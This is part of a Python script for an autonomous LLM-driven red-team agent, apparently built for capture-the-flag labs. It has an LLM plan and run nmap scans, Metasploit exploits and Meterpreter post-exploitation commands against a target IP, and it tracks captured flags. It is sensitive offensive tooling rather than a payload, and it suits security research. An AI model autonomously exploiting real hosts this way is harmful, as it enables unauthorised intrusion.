        self.history.append({"role": "user", "content": user_input})
        print(f"  [Agent model: {self.model}] thinking...")
        
        self.history = self.history[-8:]
        raw = self._call(self.history)

        self.history.append({"role": "assistant", "content": raw["content"]})
        memory.log(f"agent:{self.model}", raw["content"], raw["thinking"])

        memory.log_tokens(
            model             = self.model,
            prompt_tokens     = raw["prompt_tokens"],
            completion_tokens = raw["completion_tokens"],
            total_tokens      = raw["total_tokens"],
        )
        print(f"  [Tokens] prompt={raw['prompt_tokens']} "
              f"completion={raw['completion_tokens']} "
              f"total={raw['total_tokens']}")

        plan = json.loads(self._extract_json(raw["content"]))
        plan["model"] = self.model
        return plan


# ── Perception Layer ──────────────────────────────────────────────────────────

def gather_state(memory: AgentMemory, target_ip: str) -> str:
    state_parts = [f"Target host: {target_ip}"]
    ports = memory.open_ports.get(target_ip)
    if not ports:
        state_parts.append("No open ports discovered yet. Begin with a port scan.")
    else:
        state_parts.append(f"Known open ports: {ports}")

    if memory.available_modules:
        state_parts.append(
            "Available Metasploit modules:\n"
            + "\n".join(
                f"- {m}"
                for m in memory.available_modules
            )
        )

    recent = None

    if memory.successful_actions:
        recent = memory.successful_actions[-1]

    if memory.failed_actions:
        failed = memory.failed_actions[-1]

        if (
            recent is None or
            failed["iteration"] > recent["iteration"]
        ):
            recent = failed

    if recent:
        state_parts.append(
            f"Most recent action: {recent['action']}\n"
            f"Success: {recent['success']}\n"
            f"Output snippet: {recent['output'][:3000]}"
        )

    return "\n".join(state_parts)


# ── Result Parser ─────────────────────────────────────────────────────────────

def parse_nmap_ports(output: str) -> list:
    ports = []
    for line in output.splitlines():
        if "/tcp" in line and "open" in line:
            try:
                ports.append(int(line.split("/")[0].strip()))
            except ValueError:
                pass
    return ports

def parse_msf_modules(output: str) -> list[str]:
    """
    Extract Metasploit module paths from 'search' output.

    Example:
    exploit/windows/smb/ms17_010_eternalblue
    exploit/windows/smb/webexec
    auxiliary/scanner/smb/smb_version
    """

    modules = []

    for line in output.splitlines():
        line = line.strip()

        parts = line.split()

        if len(parts) < 2:
            continue

        candidate = parts[1]

        if "/" not in candidate:
            continue

        if candidate.startswith((
            "exploit/"
        )):
            modules.append(candidate)
    return sorted(set(modules))

def remove_prompt_echoes(text):
    cleaned = []

    for line in text.splitlines():

        stripped = line.strip()

        if stripped.startswith("msf "):
            continue

        if stripped.startswith("meterpreter "):
            continue

        cleaned.append(line)

    return "\n".join(cleaned)


# ── Main Agent Loop ───────────────────────────────────────────────────────────

def run_agent(
    target_ip: str,
    model: str,
    max_iterations: int,
    local: str
):
    session_start = time.time()
    print(f"[*] Starting single-LLM autonomous red-team agent")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Model:  {model}")
    print(f"[*] Local:  {local}\n")

    memory = AgentMemory()
    safety = SafetyController(target_ip, local)
    executor = ToolExecutor(safety, local)
    planner = SingleLLMPlanner(model, target_ip, local)
    flags_found = []
    last_result: Optional[ActionResult] = None
    last_plan: Optional[dict] = None
    pending_action_record: Optional[dict] = None

    for iteration in range(max_iterations):
        print(f"\n{'='*60}")
        print(f"[Iteration {iteration + 1}/{max_iterations}]")

        # 1. PERCEIVE
        state = gather_state(memory, target_ip)
        if executor._msf is not None:
            state += (
                f"\n\nMetasploit Status:\n"
                f"Running: {executor._msf.is_alive()}\n"
                f"Active Session: {executor._msf.active_session_id}\n"
                f"Raw Shell: {executor._msf.in_raw_shell}\n"
            )

            if executor._msf.active_session_id:

                state += (
                    "\n\nIMPORTANT:\n"
                    "You already have remote access to the target.\n"
                    f"Active Meterpreter Session: "
                    f"{executor._msf.active_session_id}\n"
                    "Do NOT launch another exploit.\n"
                    "Use post-exploitation commands.\n"
                )
        print(f"[State]\n{state}\n")

        # 2. PLAN — single LLM call returns everything
        try:
            plan = planner.plan(
                state,
                memory,
                flags_found,
                last_result=last_result,
                last_plan=last_plan,
            )
        except (json.JSONDecodeError, KeyError) as e:
            print(f"[!] LLM returned invalid JSON: {e}. Retrying.")
            continue

        # Evaluate the previous action using the LLM's semantic judgement.
        if last_result is not None and pending_action_record is not None:
            semantic_success = plan.get("last_action_success")
            assessment = plan.get("last_action_assessment", "")

            if isinstance(semantic_success, str):
                normalized = semantic_success.strip().lower()
                if normalized in {"true", "yes"}:
                    semantic_success = True
                elif normalized in {"false", "no"}:
                    semantic_success = False

            if isinstance(semantic_success, bool):

                # Special case: launching msfconsole alone should never count
                # as a successful pentesting action.
                if pending_action_record["command"].strip() == "msfconsole":
                    semantic_success = False
                    assessment = (
                        "Launching msfconsole alone is not a successful "
                        "penetration-testing action."
                    )

                pending_action_record["success"] = semantic_success
                pending_action_record["success_assessment"] = assessment

                if semantic_success:

                    memory.successful_actions.append(
                        pending_action_record
                    )

                    # Nmap parsing
                    if "nmap" in pending_action_record["command"]:

                        ports = parse_nmap_ports(
                            pending_action_record["output"]
                        )

                        if ports:
                            memory.open_ports[target_ip] = ports

                            print(
                                f"[*] Open ports on {target_ip}: "
                                f"{ports}"
                            )

                    # Metasploit search parsing
                    if pending_action_record["command"].startswith(
                        "search "
                    ):
                        modules = parse_msf_modules(
                            pending_action_record["output"]
                        )

                        if modules:
                            # Store exploit modules only
                            new_modules = [
                                m for m in modules
                                if m.startswith("exploit/")
                            ]

                            memory.available_modules = sorted(
                                set(memory.available_modules + new_modules)
                            )
                           
                            print(
                                f"[*] Stored "
                                f"{len(memory.available_modules)} "
                                f"Metasploit exploit modules."
                            )

                else:

                    memory.failed_actions.append(
                        pending_action_record
                    )

                print(
                    f"  [Previous action evaluation] "
                    f"Success: {semantic_success} | "
                    f"{assessment}"
                )
            else:
                # Keep the loop moving if a small model omits the evaluator field.
                # The exit-code result is retained only as a fallback, not as the
                # normal success criterion.
                pending_action_record["success"] = last_result.success
                pending_action_record["success_assessment"] = (
                    "LLM did not return a valid semantic evaluation; "
                    "fallback to process result."
                )
                if last_result.success:
                    memory.successful_actions.append(pending_action_record)
                else:
                    memory.failed_actions.append(pending_action_record)

            last_result = None
            last_plan = None
            pending_action_record = None

        print(f"[Plan] Phase: {plan.get('phase')} | Action: {plan.get('action')}")
        print(f"       Reasoning: {plan.get('reasoning')}")
        print(f"       Command: {plan.get('command')}")
        print(f"       Risk: {plan.get('risk')}")
        print(f"       Persistent shell: {plan.get('persistent_shell', False)}")

        if plan.get("phase") == "complete":
            print("\n[*] Agent declared mission complete.")
            break

        # 3. ACT
        use_persistent = plan.get("persistent_shell", False)
        if use_persistent:
            result = executor.run_persistent(
                plan["command"], target=plan.get("target")
            )
        else:
            result = executor.run(
                plan["command"], target=plan.get("target")
            )
            ports = parse_nmap_ports(result.stdout)

            if ports:
                memory.open_ports[target_ip] = ports

        print(f"\n[Result] Success: {result.success} | "
              f"Duration: {result.duration_seconds:.1f}s | "
              f"Mode: {'persistent' if use_persistent else 'subprocess'}")
        if result.stdout:
            print(f"[stdout]\n{result.stdout[:500]}")
        if result.stderr:
            print(f"[stderr]\n{result.stderr[:200]}")

        # 4. FLAG CHECK
        flag = check_for_flag(result.stdout)
        if flag:
            print(f"\n  🚩 FLAG FOUND: {flag}")
            flags_found.append({
                "iteration": iteration + 1,
                "phase": plan.get("phase"),
                "command": result.command,
                "flag": flag
            })

        # 5. UPDATE MEMORY
        # Classification is deferred until the next planner call, where the LLM
        # sees this action's stdout/stderr and evaluates whether it actually worked.
        action_record = {
            "iteration": iteration + 1,
            "action": plan.get("action"),
            "command": result.command,
            "output": result.stdout,
            "stderr": result.stderr,
            "phase": plan.get("phase"),
            "persistent_shell": use_persistent,
            "success": None,
            "success_assessment": "pending semantic evaluation",
        }
        pending_action_record = action_record
        last_result = result
        last_plan = plan

    # If the loop ended immediately after an action, that final action has not yet
    # gone through the next planning call's semantic evaluation.
    if pending_action_record is not None:
        pending_action_record["success_assessment"] = (
            "Not semantically evaluated because the session ended after this action."
        )

    session_duration = time.time() - session_start
    # ── SESSION END ───────────────────────────────────────────────────────────
    log_file = f"session_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    total_prompt_tokens     = sum(e["prompt_tokens"]     for e in memory.token_usage)
    total_completion_tokens = sum(e["completion_tokens"] for e in memory.token_usage)
    grand_total_tokens      = sum(e["total_tokens"]      for e in memory.token_usage)

    session_data = {
        "target": target_ip,
        "model": model,
        "log":            memory.session_log,
        "iterations":   iteration,
        "flags_captured": flags_found,
        "flag_count": len(flags_found),
        "open_ports": memory.open_ports,
        "total_actions":  safety.action_count,
        "successes":      len(memory.successful_actions),
        "failures":       len(memory.failed_actions),
        "pending_action": pending_action_record,
        "successful_actions": memory.successful_actions,
        "failed_actions": memory.failed_actions,
        "session_duration": session_duration,
        "token_usage":    memory.token_usage,
        "token_summary": {
            "model":                  model,
            "call_count":             len(memory.token_usage),
            "total_prompt_tokens":    total_prompt_tokens,
            "total_completion_tokens": total_completion_tokens,
            "grand_total_tokens":     grand_total_tokens,
        },
    }
    with open(log_file, "w") as f:
        json.dump(session_data, f, indent=2)

    print(f"\n[*] Session log saved to {log_file}")
    print(f"[*] Total actions: {safety.action_count}")
    print(f"[*] Successes: {len(memory.successful_actions)} | "
          f"Failures: {len(memory.failed_actions)}")

    print(f"\n[*] Token usage summary ({model}):")
    print(f"    Calls:      {len(memory.token_usage)}")
    print(f"    Prompt:     {total_prompt_tokens}")
    print(f"    Completion: {total_completion_tokens}")
    print(f"    Total:      {grand_total_tokens}")

    if flags_found:
        print(f"\n[*] Flags captured ({len(flags_found)}):")
        for f in flags_found:
            print(f"    Iteration {f['iteration']} [{f['phase']}]: {f['flag']}")
    else:
        print("\n[*] No flags captured this session.")

    executor.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, help="IP address of target machine")
    parser.add_argument("model", type=str, help="LLM model to use")
    parser.add_argument("local", type=str, help="TP address of local machine")
    args = parser.parse_args()

    run_agent(
        target_ip=args.ip,
        model=args.model,
        max_iterations=50,
        local=args.local
    )